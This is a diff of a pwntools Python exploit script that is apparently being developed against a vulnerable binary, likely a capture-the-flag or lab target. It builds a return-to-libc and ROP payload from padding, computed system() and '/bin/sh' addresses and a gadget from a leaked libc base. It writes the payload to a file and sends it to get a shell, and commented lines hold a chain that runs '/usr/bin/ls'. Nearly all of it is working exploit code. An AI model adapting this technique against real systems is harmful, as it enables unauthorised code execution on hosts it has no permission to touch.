@@ -26,7 +26,7 @@ rop_addr = rop.ebx.address
 #my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
 #my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
 #0x000183a5
-target = libc_base + 0x001134d9
+target = libc_base + 0x001134d9 # add to esp
 my_rop = p32(target)
 #my_rop = p32(rop.ebx.address)
 #my_rop = bytes(rop)
@@ -54,7 +54,7 @@ padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"
 #payload = padding +sh_addr + system_addr
 sh_addr = system_addr + 0x120d7b
 
-payload = padding  + p32(sh_addr) + p32(system_addr)
+payload = padding  + p32(0xdeadbeef) +  p32(system_addr) +p32(sh_addr)+p32(sh_addr) +p32(0x08048830) + p32(0x08048830)+ p32(0x08048830)
 print(f"sh_addr: {str(sh_addr)}")
 payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 #payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
@@ -69,18 +69,14 @@ with open("payload", "wb+") as f:
 # separate sends cuz of annoying encoding / decoding issue with p32() and
 # strings
 #pop_eax_address = libc_base + 0x0002407e
-pop_eax_address = my_rop
 #print(f" POP: {hex(pop_eax_address)}")
 #payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
 #payload = bytes(my_rop)
 payload = my_rop
-payload += my_rop
-payload += my_rop
-payload += my_rop
 #payload = p32(0xf7e55db0) # system()
-payload += p32(0x41414141) # system()
 #payload += my_rop # pop eax  - I might need to call it like 0x128
 payload +=b"\n"
+payload += p32(0x41414141) # system()
 conn.send(payload)
 with open("payload", "ab+") as f:
     f.write(payload)
@@ -96,7 +92,7 @@ got_check = p64(exe.got['puts']) # the function address in GOT
 print(f"got addr: {got_check}, puts: {puts_addr}")
 
 print(conn.recvline()) # receive until newline
-print(conn.recvline()) # receive until newline
+#print(conn.recvline()) # receive until newline
 output = conn.recv()
 print(f"Program output: {output}") # receive until newline
 #conn.recvuntil(b"result:") # receive until given keyword
